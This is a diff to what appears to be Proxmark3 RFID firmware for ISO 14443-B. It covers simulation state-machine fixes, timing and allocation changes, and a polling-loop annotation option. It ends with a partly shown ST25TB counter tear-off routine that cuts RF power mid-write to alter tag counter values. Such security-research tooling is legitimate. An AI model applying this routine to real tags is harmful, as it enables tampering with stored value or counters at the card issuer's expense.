@@ -186,7 +186,7 @@
 #endif
 
 // 4sample
-#define SEND4STUFFBIT(x) tosend_stuffbit(x);tosend_stuffbit(x);tosend_stuffbit(x);tosend_stuffbit(x);
+#define SEND4STUFFBIT(x) tosend_stuffbit(!(x));tosend_stuffbit(!(x));tosend_stuffbit(!(x));tosend_stuffbit(!(x));
 
 static void iso14b_set_timeout(uint32_t timeout_etu);
 static void iso14b_set_maxframesize(uint16_t size);
@@ -198,6 +198,32 @@ static uint8_t s_iso14b_fwt = 9;
 static uint32_t s_iso14b_timeout = MAX_14B_TIMEOUT;
 
 static bool s_field_on = false;
+
+/*
+Default HF 14b config is set to:
+    polling_loop_annotation = {{0}, 0, 0, 0} (disabled)
+*/
+static hf14b_config_t hf14bconfig = { {{0}, 0, 0, 0} };
+
+void printHf14bConfig(void) {
+    DbpString(_CYAN_("HF 14b config"));
+    Dbprintf("  [p] Polling loop annotation.... %s %*D",
+             (hf14bconfig.polling_loop_annotation.frame_length <= 0) ? _YELLOW_("disabled") : _GREEN_("enabled"),
+             hf14bconfig.polling_loop_annotation.frame_length,
+             hf14bconfig.polling_loop_annotation.frame,
+             ""
+            );
+}
+
+void setHf14bConfig(const hf14b_config_t *hc) {
+    if (hc->polling_loop_annotation.frame_length >= 0) {
+        memcpy(&hf14bconfig.polling_loop_annotation, &hc->polling_loop_annotation, sizeof(iso14b_polling_frame_t));
+    }
+}
+
+hf14b_config_t *getHf14bConfig(void) {
+    return &hf14bconfig;
+}
 
 /*
 * ISO 14443-B communications
@@ -702,10 +728,11 @@ static void TransmitFor14443b_AsTag(const uint8_t *response, uint16_t len) {
     // Signal field is off with the appropriate LED
     LED_D_OFF();
 
+    // TR0: min - 1024 cycles = 75.52 us - max 4096 cycles = 302.08 us
+    SpinDelayUs(76);
+
     // Modulate BPSK
     FpgaWriteConfWord(FPGA_MAJOR_MODE_HF_SIMULATOR | FPGA_HF_SIMULATOR_MODULATE_BPSK);
-    AT91C_BASE_SSC->SSC_THR = 0xFF;
-    FpgaSetupSsc(FPGA_MAJOR_MODE_HF_SIMULATOR);
 
     // Transmit the response.
     for (uint16_t i = 0; i < len;) {
@@ -713,6 +740,11 @@ static void TransmitFor14443b_AsTag(const uint8_t *response, uint16_t len) {
         // Put byte into tx holding register as soon as it is ready
         if (AT91C_BASE_SSC->SSC_SR & AT91C_SSC_TXRDY) {
             AT91C_BASE_SSC->SSC_THR = response[i++];
+
+            // Start-up SSC once first byte is in SSC_THR
+            if (i == 1) {
+                FpgaSetupSsc(FPGA_MAJOR_MODE_HF_SIMULATOR);
+            }
         }
     }
 }
@@ -771,23 +803,23 @@ void SimulateIso14443bTag(const uint8_t *pupi) {
     static const uint8_t respOK[] = {0x00, 0x78, 0xF0};
 
     uint16_t len, cmdsReceived = 0;
-    int cardSTATE = SIM_NOFIELD;
+    int cardSTATE = SIM_POWER_OFF;
     int vHf = 0; // in mV
 
-    tosend_t *ts = get_tosend();
+    const tosend_t *ts = get_tosend();
 
     uint8_t *receivedCmd = BigBuf_calloc(MAX_FRAME_SIZE);
 
     // prepare "ATQB" tag answer (encoded):
     CodeIso14443bAsTag(respATQB, sizeof(respATQB));
-    uint8_t *encodedATQB = BigBuf_malloc(ts->max);
+    uint8_t *encodedATQB = BigBuf_calloc(ts->max);
     uint16_t encodedATQBLen = ts->max;
     memcpy(encodedATQB, ts->buf, ts->max);
 
 
     // prepare "OK" tag answer (encoded):
     CodeIso14443bAsTag(respOK, sizeof(respOK));
-    uint8_t *encodedOK = BigBuf_malloc(ts->max);
+    uint8_t *encodedOK = BigBuf_calloc(ts->max);
     uint16_t encodedOKLen = ts->max;
     memcpy(encodedOK, ts->buf, ts->max);
 
@@ -801,16 +833,18 @@ void SimulateIso14443bTag(const uint8_t *pupi) {
         }
 
         // find reader field
-        if (cardSTATE == SIM_NOFIELD) {
-
-            vHf = (MAX_ADC_HF_VOLTAGE * SumAdc(ADC_CHAN_HF, 32)) >> 15;
-            if (vHf > MF_MINFIELDV) {
+        vHf = (MAX_ADC_HF_VOLTAGE * SumAdc(ADC_CHAN_HF, 32)) >> 15;
+        if (vHf > MF_MINFIELDV) {
+            if (cardSTATE == SIM_POWER_OFF) {
                 cardSTATE = SIM_IDLE;
                 LED_A_ON();
             }
+        } else {
+            cardSTATE = SIM_POWER_OFF;
+            LED_A_OFF();
         }
 
-        if (cardSTATE == SIM_NOFIELD) {
+        if (cardSTATE == SIM_POWER_OFF) {
             continue;
         }
 
@@ -820,73 +854,85 @@ void SimulateIso14443bTag(const uint8_t *pupi) {
             break;
         }
 
-        // ISO14443-B protocol states:
-        // REQ or WUP request in ANY state
-        // WUP in HALTED state
-        if (len == 5) {
-            if (((receivedCmd[0] == ISO14443B_REQB) && ((receivedCmd[2] & 0x08) == 0x08) && (cardSTATE == SIM_HALTED)) ||
-                    (receivedCmd[0] == ISO14443B_REQB)) {
+        LogTrace(receivedCmd, len, 0, 0, NULL, true);
 
-                LogTrace(receivedCmd, len, 0, 0, NULL, true);
-                cardSTATE = SIM_SELECTING;
-            }
-        }
-
-        /*
-        * How should this flow go?
-        *  REQB or WUPB
-        *   send response  ( waiting for Attrib)
-        *  ATTRIB
-        *   send response  ( waiting for commands 7816)
-        *  HALT
-            send halt response ( waiting for wupb )
-        */
-
-        switch (cardSTATE) {
-            //case SIM_NOFIELD:
-            case SIM_HALTED:
-            case SIM_IDLE: {
-                LogTrace(receivedCmd, len, 0, 0, NULL, true);
-                break;
-            }
-            case SIM_SELECTING: {
-                TransmitFor14443b_AsTag(encodedATQB, encodedATQBLen);
-                LogTrace(respATQB, sizeof(respATQB), 0, 0, NULL, false);
-                cardSTATE = SIM_WORK;
-                break;
-            }
-            case SIM_HALTING: {
-                TransmitFor14443b_AsTag(encodedOK, encodedOKLen);
-                LogTrace(respOK, sizeof(respOK), 0, 0, NULL, false);
-                cardSTATE = SIM_HALTED;
-                break;
-            }
-            case SIM_ACKNOWLEDGE: {
-                TransmitFor14443b_AsTag(encodedOK, encodedOKLen);
-                LogTrace(respOK, sizeof(respOK), 0, 0, NULL, false);
-                cardSTATE = SIM_IDLE;
-                break;
-            }
-            case SIM_WORK: {
-                if (len == 7 && receivedCmd[0] == ISO14443B_HALT) {
-                    cardSTATE = SIM_HALTED;
-                } else if (len == 11 && receivedCmd[0] == ISO14443B_ATTRIB) {
-                    cardSTATE = SIM_ACKNOWLEDGE;
-                } else {
-                    // Todo:
-                    // - SLOT MARKER
-                    // - ISO7816
-                    // - emulate with a memory dump
-                    if (g_dbglevel >= DBG_DEBUG) {
-                        Dbprintf("new cmd from reader: len=%d, cmdsRecvd=%d", len, cmdsReceived);
-                    }
-
-                    cardSTATE = SIM_IDLE;
+        if ((len == 5) && (receivedCmd[0] == ISO14443B_REQB) && (receivedCmd[2] & 0x08)) {
+            // WUPB
+            switch (cardSTATE) {
+                case SIM_IDLE:
+                case SIM_READY:
+                case SIM_HALT: {
+                    TransmitFor14443b_AsTag(encodedATQB, encodedATQBLen);
+                    LogTrace(respATQB, sizeof(respATQB), 0, 0, NULL, false);
+                    cardSTATE = SIM_READY;
+                    break;
                 }
-                break;
+                case SIM_ACTIVE:
+                default: {
+                    TransmitFor14443b_AsTag(encodedATQB, encodedATQBLen);
+                    LogTrace(respATQB, sizeof(respATQB), 0, 0, NULL, false);
+                    break;
+                }
             }
-            default: {
-                break;
+        } else if ((len == 5) && (receivedCmd[0] == ISO14443B_REQB) && !(receivedCmd[2] & 0x08)) {
+            // REQB
+            switch (cardSTATE) {
+                case SIM_IDLE:
+                case SIM_READY: {
+                    TransmitFor14443b_AsTag(encodedATQB, encodedATQBLen);
+                    LogTrace(respATQB, sizeof(respATQB), 0, 0, NULL, false);
+                    cardSTATE = SIM_READY;
+                    break;
+                }
+                case SIM_ACTIVE: {
+                    TransmitFor14443b_AsTag(encodedATQB, encodedATQBLen);
+                    LogTrace(respATQB, sizeof(respATQB), 0, 0, NULL, false);
+                    break;
+                }
+                case SIM_HALT:
+                default: {
+                    break;
+                }
+            }
+        } else if ((len == 7) && (receivedCmd[0] == ISO14443B_HALT)) {
+            // HLTB
+            switch (cardSTATE) {
+                case SIM_READY: {
+                    TransmitFor14443b_AsTag(encodedOK, encodedOKLen);
+                    LogTrace(respOK, sizeof(respOK), 0, 0, NULL, false);
+                    cardSTATE = SIM_HALT;
+                    break;
+                }
+                case SIM_IDLE:
+                case SIM_ACTIVE: {
+                    TransmitFor14443b_AsTag(encodedOK, encodedOKLen);
+                    LogTrace(respOK, sizeof(respOK), 0, 0, NULL, false);
+                    break;
+                }
+                case SIM_HALT:
+                default: {
+                    break;
+                }
+            }
+        } else if (len == 11 && receivedCmd[0] == ISO14443B_ATTRIB) {
+            // ATTRIB
+            switch (cardSTATE) {
+                case SIM_READY: {
+                    TransmitFor14443b_AsTag(encodedOK, encodedOKLen);
+                    LogTrace(respOK, sizeof(respOK), 0, 0, NULL, false);
+                    cardSTATE = SIM_ACTIVE;
+                    break;
+                }
+                case SIM_IDLE:
+                case SIM_ACTIVE: {
+                    TransmitFor14443b_AsTag(encodedOK, encodedOKLen);
+                    LogTrace(respOK, sizeof(respOK), 0, 0, NULL, false);
+                    break;
+                }
+                case SIM_HALT:
+                default: {
+                    break;
+                }
             }
         }
 
@@ -960,7 +1006,6 @@ void Simulate_iso14443b_srx_tag(uint8_t *uid) {
     // allocate command receive buffer
     BigBuf_free();
     BigBuf_Clear_ext(false);
-    clear_trace();
     set_tracing(true);
 
     uint16_t len, cmdsReceived = 0;
@@ -969,18 +1014,18 @@ void Simulate_iso14443b_srx_tag(uint8_t *uid) {
 
     tosend_t *ts = get_tosend();
 
-    uint8_t *receivedCmd = BigBuf_malloc(MAX_FRAME_SIZE);
+    uint8_t *receivedCmd = BigBuf_calloc(MAX_FRAME_SIZE);
 
     // prepare "ATQB" tag answer (encoded):
     CodeIso14443bAsTag(respATQB, sizeof(respATQB));
-    uint8_t *encodedATQB = BigBuf_malloc(ts->max);
+    uint8_t *encodedATQB = BigBuf_calloc(ts->max);
     uint16_t encodedATQBLen = ts->max;
     memcpy(encodedATQB, ts->buf, ts->max);
 
 
     // prepare "OK" tag answer (encoded):
     CodeIso14443bAsTag(respOK, sizeof(respOK));
-    uint8_t *encodedOK = BigBuf_malloc(ts->max);
+    uint8_t *encodedOK = BigBuf_calloc(ts->max);
     uint16_t encodedOKLen = ts->max;
     memcpy(encodedOK, ts->buf, ts->max);
 
@@ -1317,6 +1362,7 @@ static int Get14443bAnswerFromTag(uint8_t *response, uint16_t max_len, uint32_t 
     // The DMA buffer, used to stream samples from the FPGA
     dmabuf16_t *dma = get_dma16();
     if (dma == NULL) {
+        if (g_dbglevel >= DBG_DEBUG) Dbprintf("Failed to allocate memory");
         return PM3_EMALLOC;
     }
 
@@ -1333,10 +1379,23 @@ static int Get14443bAnswerFromTag(uint8_t *response, uint16_t max_len, uint32_t 
     LED_D_ON();
     FpgaWriteConfWord(FPGA_MAJOR_MODE_HF_READER | FPGA_HF_READER_SUBCARRIER_848_KHZ | FPGA_HF_READER_MODE_RECEIVE_IQ);
 
+    uint32_t wait_start_time = GetTickCount();
+
     for (;;) {
 
         volatile uint16_t behindBy = ((uint16_t *)AT91C_BASE_PDC_SSC->PDC_RPR - upTo) & (DMA_BUFFER_SIZE - 1);
         if (behindBy == 0) {
+            WDT_HIT();
+            if (BUTTON_PRESS()) {
+                ret = PM3_EOPABORTED;
+                break;
+            }
+            // Failsafe: if the FPGA SSC clock drops completely, DMA will freeze eternally.
+            // We use the ARM's main tick counter (1ms) instead of the SSP clock.
+            if (samples == 0 && GetTickCountDelta(wait_start_time) > 200) {
+                ret = PM3_ETIMEOUT;
+                break;
+            }
             continue;
         }
 
@@ -1361,12 +1420,12 @@ static int Get14443bAnswerFromTag(uint8_t *response, uint16_t max_len, uint32_t 
             if (AT91C_BASE_SSC->SSC_SR & (AT91C_SSC_ENDRX)) {
 
                 // primary buffer was stopped
-                if (AT91C_BASE_PDC_SSC->PDC_RCR == false) {
+                if (AT91C_BASE_PDC_SSC->PDC_RCR == 0) {
                     AT91C_BASE_PDC_SSC->PDC_RPR = (uint32_t) dma->buf;
                     AT91C_BASE_PDC_SSC->PDC_RCR = DMA_BUFFER_SIZE;
                 }
                 // secondary buffer sets as primary, secondary buffer was stopped
-                if (AT91C_BASE_PDC_SSC->PDC_RNCR == false) {
+                if (AT91C_BASE_PDC_SSC->PDC_RNCR == 0) {
                     AT91C_BASE_PDC_SSC->PDC_RNPR = (uint32_t) dma->buf;
                     AT91C_BASE_PDC_SSC->PDC_RNCR = DMA_BUFFER_SIZE;
                 }
@@ -1565,8 +1624,8 @@ static void CodeIso14443bAsReader(const uint8_t *cmd, int len, bool framing) {
 /*
 *  Convenience function to encode, transmit and trace iso 14443b comms
 */
-static void CodeAndTransmit14443bAsReader(const uint8_t *cmd, int len, uint32_t *start_time, uint32_t *eof_time, bool framing) {
-    tosend_t *ts = get_tosend();
+void CodeAndTransmit14443bAsReader(const uint8_t *cmd, int len, uint32_t *start_time, uint32_t *eof_time, bool framing) {
+    const tosend_t *ts = get_tosend();
     CodeIso14443bAsReader(cmd, len, framing);
     TransmitFor14443b_AsReader(start_time);
     if (g_trigger) LED_A_ON();
@@ -1582,9 +1641,13 @@ static void CodeAndTransmit14443bAsReader(const uint8_t *cmd, int len, uint32_t 
 /* Sends an APDU to the tag
  * TODO: check CRC and preamble
  */
-int iso14443b_apdu(uint8_t const *msg, size_t msg_len, bool send_chaining, void *rxdata, uint16_t rxmaxlen, uint8_t *response_byte, uint16_t *reponselen) {
+int iso14443b_apdu(uint8_t const *msg, size_t msg_len, bool send_chaining, void *rxdata, uint16_t rxmaxlen, uint8_t *response_byte, uint16_t *responselen) {
 
-    uint8_t real_cmd[msg_len + 4];
+    if (msg_len > PM3_CMD_DATA_SIZE) {
+        return PM3_EINVARG;
+    }
+
+    uint8_t real_cmd[PM3_CMD_DATA_SIZE + 4];
 
     if (msg_len) {
         // ISO 14443 APDU frame: PCB [CID] [NAD] APDU CRC PCB=0x02
@@ -1693,8 +1756,8 @@ int iso14443b_apdu(uint8_t const *msg, size_t msg_len, bool send_chaining, void 
         }
     }
 
-    if (reponselen) {
-        *reponselen = len;
+    if (responselen) {
+        *responselen = len;
     }
     return PM3_SUCCESS;
 }
@@ -1780,7 +1843,7 @@ static int iso14443b_select_cts_card(iso14b_cts_card_select_t *card) {
 /**
 * SRx Initialise.
 */
-static int iso14443b_select_srx_card(iso14b_card_select_t *card) {
+int iso14443b_select_srx_card(iso14b_card_select_t *card) {
     // INITIATE command: wake up the tag using the INITIATE
     static const uint8_t init_srx[] = { ISO14443B_INITIATE, 0x00, 0x97, 0x5b };
     uint8_t r_init[3] = { 0x00 };
@@ -2033,9 +2096,28 @@ int iso14443b_select_card(iso14b_card_select_t *card) {
     uint8_t r_pupid[14] = { 0x00 };
     uint8_t r_attrib[3] = { 0x00 };
 
-    // first, wake up the tag
     uint32_t start_time = 0;
     uint32_t eof_time = 0;
+
+    // Send polling loop annotation if configured (3 times before WUPB)
+    if (hf14bconfig.polling_loop_annotation.frame_length > 0) {
+        const iso14b_polling_frame_t *pla = &hf14bconfig.polling_loop_annotation;
+
+        for (int i = 0; i < 3; i++) {
+            CodeAndTransmit14443bAsReader(pla->frame, pla->frame_length, &start_time, &eof_time, true);
+
+            // Add extra delay if specified
+            if (pla->extra_delay > 0) {
+                SpinDelayUs(pla->extra_delay * 1000);
+            }
+
+            // Reset timing for the next iteration
+            start_time = 0;
+            eof_time = 0;
+        }
+    }
+
+    // first, wake up the tag
     CodeAndTransmit14443bAsReader(wupb, sizeof(wupb), &start_time, &eof_time, true);
 
     eof_time += DELAY_ISO14443B_PCD_TO_PICC_READER;
@@ -2115,6 +2197,9 @@ static int iso14443b_select_picopass_card(picopass_hdr_t *hdr) {
     static uint8_t act_all[] = { ICLASS_CMD_ACTALL };
     static uint8_t identify[] = { ICLASS_CMD_READ_OR_IDENTIFY };
     static uint8_t read_conf[] = { ICLASS_CMD_READ_OR_IDENTIFY, 0x01, 0xfa, 0x22 };
+
+    // ICLASS_CMD_SELECT  0x81 tells  ISO14443b/BPSK coding/106 kbits/s
+    // ICLASS_CMD_SELECT  0x41 tells  ISO14443b/BPSK coding/423 kbits/s
     uint8_t select[] = { 0x80 | ICLASS_CMD_SELECT, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
     uint8_t read_aia[] = { ICLASS_CMD_READ_OR_IDENTIFY, 0x05, 0xde, 0x64};
     uint8_t read_check_cc[] = { 0x80 | ICLASS_CMD_READCHECK, 0x02 };
@@ -2287,7 +2372,7 @@ void iso14443b_setup(void) {
 //
 // I tried to be systematic and check every answer of the tag, every CRC, etc...
 //-----------------------------------------------------------------------------
-static int read_14b_srx_block(uint8_t blocknr, uint8_t *block) {
+int read_14b_srx_block(uint8_t blocknr, uint8_t *block) {
 
     uint8_t cmd[] = {ISO14443B_READ_BLK, blocknr, 0x00, 0x00};
     AddCrc14B(cmd, 2);
@@ -2382,8 +2467,8 @@ void SniffIso14443b(void) {
     uint8_t ua_buf[MAX_FRAME_SIZE] = {0};
     Uart14bInit(ua_buf);
 
-    //Demod14bInit(BigBuf_malloc(MAX_FRAME_SIZE), MAX_FRAME_SIZE);
-    //Uart14bInit(BigBuf_malloc(MAX_FRAME_SIZE));
+    //Demod14bInit(BigBuf_calloc(MAX_FRAME_SIZE));
+    //Uart14bInit(BigBuf_calloc(MAX_FRAME_SIZE));
 
     // Set FPGA in the appropriate mode
     FpgaWriteConfWord(FPGA_MAJOR_MODE_HF_READER | FPGA_HF_READER_SUBCARRIER_848_KHZ | FPGA_HF_READER_MODE_SNIFF_IQ);
@@ -2443,12 +2528,12 @@ void SniffIso14443b(void) {
             if (AT91C_BASE_SSC->SSC_SR & (AT91C_SSC_ENDRX)) {
 
                 // primary buffer was stopped
-                if (AT91C_BASE_PDC_SSC->PDC_RCR == false) {
+                if (AT91C_BASE_PDC_SSC->PDC_RCR == 0) {
                     AT91C_BASE_PDC_SSC->PDC_RPR = (uint32_t) dma->buf;
                     AT91C_BASE_PDC_SSC->PDC_RCR = DMA_BUFFER_SIZE;
                 }
                 // secondary buffer sets as primary, secondary buffer was stopped
-                if (AT91C_BASE_PDC_SSC->PDC_RNCR == false) {
+                if (AT91C_BASE_PDC_SSC->PDC_RNCR == 0) {
                     AT91C_BASE_PDC_SSC->PDC_RNPR = (uint32_t) dma->buf;
                     AT91C_BASE_PDC_SSC->PDC_RNCR = DMA_BUFFER_SIZE;
                 }
@@ -2541,6 +2626,459 @@ static void iso14b_set_trigger(bool enable) {
     g_trigger = enable;
 }
 
+//=============================================================================
+// ST25TB COUNTER TEAR-OFF IMPLEMENTATION
+// Ported from near-field-chaos / hf_st25_tearoff standalone
+//=============================================================================
+
+// Tear-off constants
+#define TEAROFF_INITIAL_DELAY_US     150
+#define TEAROFF_MIN_DELAY_US         0
+#define TEAROFF_ADJUSTMENT_US_DEF    25
+#define TEAROFF_WRITE_RETRY_COUNT    30
+#define TEAROFF_CONSOLIDATE_READS    6
+#define TEAROFF_CONSOLIDATE_WAIT_RD  2
+#define TEAROFF_CONSOLIDATE_WAIT_MS  2000
+
+// Bit manipulation macros
+#define IS_ONE_BIT_T(value, index)  ((value) & ((uint32_t)1 << (index)))
+#define IS_ZERO_BIT_T(value, index) (!IS_ONE_BIT_T(value, index))
+
+// Simple PRNG for randomization in tear-off value selection
+static unsigned long s_tearoff_prng_seed = 1;
+static int tearoff_rand(void) {
+    s_tearoff_prng_seed = s_tearoff_prng_seed * 1103515245 + 12345;
+    return (unsigned int)(s_tearoff_prng_seed / 65536) % 32768;
+}
+
+// Quick field restart after tear-off (FPGA bitstream already loaded, buffers allocated).
+// This is MUCH faster than full iso14443b_setup() since it skips:
+//  - FpgaDownloadAndGo (bitstream already cached)
+//  - BigBuf_free + BigBuf_calloc (demod buffers persist)
+//  - 100ms field stabilization (tag only needs ~20ms to power up)
+static void tearoff_field_on(void) {
+    // Reset the AT91 SSC PDC (DMA) receive buffer before each field-on
+    // by mirroring iso14443b_setup() memory allocations for Demod14b/Uart14b.
+    BigBuf_free();
+    Demod14bInit(BigBuf_calloc(MAX_FRAME_SIZE), MAX_FRAME_SIZE);
+    Uart14bInit(BigBuf_calloc(MAX_FRAME_SIZE));
+
+    SetAdcMuxFor(GPIO_MUXSEL_HIPKD);
+    FpgaSetupSsc(FPGA_MAJOR_MODE_HF_READER); // programs PDC with fresh BigBuf address
+#ifdef RDV4
+    FpgaWriteConfWord(FPGA_MAJOR_MODE_HF_READER | FPGA_HF_READER_MODE_SEND_SHALLOW_MOD_RDV4);
+#else
+    FpgaWriteConfWord(FPGA_MAJOR_MODE_HF_READER | FPGA_HF_READER_MODE_SEND_SHALLOW_MOD);
+#endif
+    // Field stabilization: tag needs time to power up from RF.
+    SpinDelayUs(250);
+    StartCountSspClk();
+    iso14b_set_fwt(8);
+    s_field_on = true;
+}
+
+// Cut the RF field.
+// drain_capacitor: pass true after a tear-off write to drain the tag's charge pump
+static void tearoff_field_off(bool drain_capacitor) {
+    FpgaWriteConfWord(FPGA_MAJOR_MODE_OFF);
+    s_field_on = false;
+    if (drain_capacitor) {
+        SpinDelayUs(500); // ST25TB tRST minimum drain
+    }
+}
+
+static void tearoff_exit(void) {
+    g_tearoff_enabled = false;
+    g_tearoff_delay_us = 0;
+    // Force a full FPGA bitstream reload on the next HF command.
+    // After hundreds of rapid field on/off cycles, the FPGA's internal
+    // state machine (SSC/DMA) can become corrupted even though its bitstream
+    // is technically loaded. Invalidating the cache forces FpgaDownloadAndGo()
+    // to do a complete re-initialization next time.
+    FpgaResetBitstream();
+    switch_off();
+    SpinDelay(20);
+    BigBuf_free_keep_EM();
+    s_field_on = false;
+}
+
+// Read a single ST25TB/SRx block with lightweight field cycle
+static int tearoff_read_block(uint8_t block_address, uint32_t *block_value) {
+    int res;
+    iso14b_card_select_t card;
+
+    tearoff_field_on();
+
+    res = iso14443b_select_srx_card(&card);
+    if (res != PM3_SUCCESS) {
+        tearoff_field_off(false); // select failed, no write in progress
+        return res;
+    }
+
+    uint8_t block[ISO14B_BLOCK_SIZE];
+    res = read_14b_srx_block(block_address, block);
+    if (res == PM3_SUCCESS) {
+        *block_value = (uint32_t)block[0] |
+                       ((uint32_t)block[1] << 8) |
+                       ((uint32_t)block[2] << 16) |
+                       ((uint32_t)block[3] << 24);
+    }
+
+    tearoff_field_off(false); // plain read, no write in progress
+    return res;
+}
+
+// Low-level write command (no response expected for SRx write)
+static int tearoff_cmd_write_block(uint8_t block_address, uint8_t *block) {
+    uint8_t cmd[] = {ISO14443B_WRITE_BLK, block_address, block[0], block[1], block[2], block[3], 0x00, 0x00};
+    AddCrc14B(cmd, 6);
+
+    uint32_t start_time = 0;
+    uint32_t eof_time = 0;
+    CodeAndTransmit14443bAsReader(cmd, sizeof(cmd), &start_time, &eof_time, true);
+    return PM3_SUCCESS;
+}
+
+// Write a block then cut RF at precise timing for tear-off effect
+static void tearoff_write_block(uint8_t block_address, uint32_t data, uint16_t tearoff_delay_us) {
+
+    uint8_t block[ISO14B_BLOCK_SIZE];
+    block[0] = (data & 0xFF);
+    block[1] = (data >> 8) & 0xFF;
+    block[2] = (data >> 16) & 0xFF;
+    block[3] = (data >> 24) & 0xFF;
+
+    tearoff_field_on();
+
+    iso14b_card_select_t card;
+    int res = iso14443b_select_srx_card(&card);
+    if (res != PM3_SUCCESS) {
+        tearoff_field_off(false); // select failed pre-write, no EEPROM activity
+        return;
+    }
+
+    g_tearoff_enabled = true;
+    g_tearoff_delay_us = tearoff_delay_us;
+
+    tearoff_cmd_write_block(block_address, block);
+
+    if (tearoff_hook() == PM3_ETEAROFF) {
+        s_field_on = false;
+        // Drain the tag's charge pump capacitor so POR triggers cleanly on next field-on.
+        SpinDelayUs(500);
+    } else {
+        tearoff_field_off(false);
+    }
+}
+
+// Write then verify with retries
+static int8_t tearoff_retry_write_verify(uint8_t block_address, uint32_t target_value,
+                                         uint32_t max_try_count, int sleep_time_ms,
+                                         uint32_t *read_back_value) {
+    uint32_t i = 0;
+    *read_back_value = ~target_value;
+
+    while (*read_back_value != target_value && i < max_try_count) {
+        tearoff_write_block(block_address, target_value, 6000); // Long delay = reliable write
+        if (sleep_time_ms > 0) SpinDelayUsPrecision(sleep_time_ms * 1000);
+        tearoff_read_block(block_address, read_back_value);
+        if (sleep_time_ms > 0) SpinDelayUsPrecision(sleep_time_ms * 1000);
+        i++;
+    }
+
+    return (*read_back_value == target_value) ? 0 : -1;
+}
+
+// Check if a value is stable (consolidated) across multiple reads
+static int8_t tearoff_is_consolidated(uint8_t block_address, uint32_t value,
+                                      int repeat_read, int sleep_time_ms,
+                                      uint32_t *read_value) {
+    int result;
+    for (int i = 0; i < repeat_read; i++) {
+        if (sleep_time_ms > 0) SpinDelayUsPrecision(sleep_time_ms * 1000);
+        result = tearoff_read_block(block_address, read_value);
+        if (result != 0 || value != *read_value) {
+            return -1;
+        }
+    }
+    return 0;
+}
+
+// Consolidate a block to a stable state with decrement writes
+static int8_t tearoff_consolidate_block(uint8_t block_address, uint32_t current_value,
+                                        uint32_t target_value, uint32_t *read_back_value) {
+    int8_t result;
+    uint32_t consolidation_value;
+
+    if (target_value <= 0xFFFFFFFD && current_value >= (target_value + 2)) {
+        consolidation_value = target_value + 2;
+    } else {
+        consolidation_value = current_value;
+    }
+
+    result = tearoff_retry_write_verify(block_address, consolidation_value - 1,
+                                        TEAROFF_WRITE_RETRY_COUNT, 0, read_back_value);
+    if (result != 0) {
+        Dbprintf("Consolidation failed at step 1 (write 0x%08X)", consolidation_value - 1);
+        return -1;
+    }
+
+    if (*read_back_value != 0xFFFFFFFE || target_value == 0xFFFFFFFD) {
+        result = tearoff_retry_write_verify(block_address, consolidation_value - 2,
+                                            TEAROFF_WRITE_RETRY_COUNT, 0, read_back_value);
+        if (result != 0) {
+            Dbprintf("Consolidation failed at step 2 (write 0x%08X)", consolidation_value - 2);
+            return -1;
+        }
+    }
+
+    if (result == 0 && target_value > 0xFFFFFFFD && *read_back_value > 0xFFFFFFFD) {
+        result = tearoff_is_consolidated(block_address, *read_back_value,
+                                         TEAROFF_CONSOLIDATE_READS, 0, read_back_value);
+        if (result == 0) {
+            result = tearoff_is_consolidated(block_address, *read_back_value,
+                                             TEAROFF_CONSOLIDATE_WAIT_RD,
+                                             TEAROFF_CONSOLIDATE_WAIT_MS, read_back_value);
+            if (result != 0) {
+                Dbprintf("Consolidation failed stability check (long wait)");
+                return -1;
+            }
+        } else {
+            Dbprintf("Consolidation failed stability check (short wait)");
+            return -1;
+        }
+    }
+
+    return 0;
+}
+
+// Calculate next value to attempt for tear-off write
+static uint32_t tearoff_next_value(uint32_t current_value, bool randomness) {
+    uint32_t value = 0;
+    int8_t index = 31;
+
+    if (current_value < 0x0000FFFF) {
+        return (current_value > 0) ? current_value - 1 : 0;
+    }
+
+    while (index >= 0) {
+        if (value == 0 && IS_ONE_BIT_T(current_value, index)) {
+            value = 0xFFFFFFFF >> (31 - index);
+            index--;
+        }
+
+        if (value != 0 && IS_ZERO_BIT_T(current_value, index)) {
+            index++;
+            value &= ~((uint32_t)1 << index);
+
+            if (randomness && value < 0xF0000000 && index > 1) {
+                value ^= ((uint32_t)1 << (tearoff_rand() % index));
+            }
+            return value;
+        }
+
+        index--;
+    }
+
+    return (current_value > 0) ? current_value - 1 : 0;
+}
+
+// Adjust tear-off timing
+static void tearoff_adjust_timing(int *tear_off_us, uint32_t tear_off_adjustment_us) {
+    *tear_off_us -= tear_off_adjustment_us;
+    if (*tear_off_us < TEAROFF_MIN_DELAY_US) {
+        *tear_off_us = TEAROFF_MIN_DELAY_US;
+    }
+}
+
+// Log tear-off attempt with binary representation
+static void tearoff_log(int tear_off_us, const char *color, uint32_t value) {
+    char bin[33];
+    for (int i = 31; i >= 0; i--) {
+        bin[31 - i] = IS_ONE_BIT_T(value, i) ? '1' : '0';
+    }
+    bin[32] = '\0';
+    Dbprintf("%s%08X%s : %s%s%s : %d us", color, value, "\033[0m", color, bin, "\033[0m", tear_off_us);
+}
+
+// Payload structure for tear-off command
+typedef struct {
+    uint8_t  block_address;
+    uint32_t target_value;
+    uint32_t tear_off_adjustment_us;
+    uint32_t safety_value;
+    uint32_t start_time_us;
+} PACKED st25tb_tearoff_params_t;
+
+// Main ST25TB tear-off function, called from appmain.c
+void ST25TB_TearOff(const uint8_t *data) {
+    const st25tb_tearoff_params_t *params = (const st25tb_tearoff_params_t *)data;
+
+    uint8_t block_address = params->block_address;
+    uint32_t target_value = params->target_value;
+    uint32_t tear_off_adjustment_us = params->tear_off_adjustment_us;
+    uint32_t safety_value = params->safety_value;
+    uint32_t start_time_us = params->start_time_us;
+
+    int result;
+    bool trigger = true;
+
+    uint32_t read_value = 0;
+    uint32_t current_value = 0;
+    uint32_t last_consolidated_value = 0;
+    uint32_t tear_off_value = 0;
+
+    // Start delay: user-specified or default TEAROFF_INITIAL_DELAY_US (150 us)
+    int tear_off_us = (start_time_us > 0) ? (int)start_time_us : TEAROFF_INITIAL_DELAY_US;
+    if (tear_off_adjustment_us == 0) {
+        tear_off_adjustment_us = TEAROFF_ADJUSTMENT_US_DEF;
+    }
+
+    // One-time full setup: loads FPGA bitstream, allocates demod buffers,
+    // configures ADC mux and SSC. All subsequent field cycles use the
+    // lightweight tearoff_field_on/off which skip the heavy initialization.
+    iso14443b_setup();
+    set_tracing(true);
+    tearoff_field_off(false); // Start with field off, tearoff_read_block will turn it on
+
+    // Initial read
+    result = tearoff_read_block(block_address, &current_value);
+    if (result != PM3_SUCCESS) {
+        Dbprintf("Initial read failed for block %d", block_address);
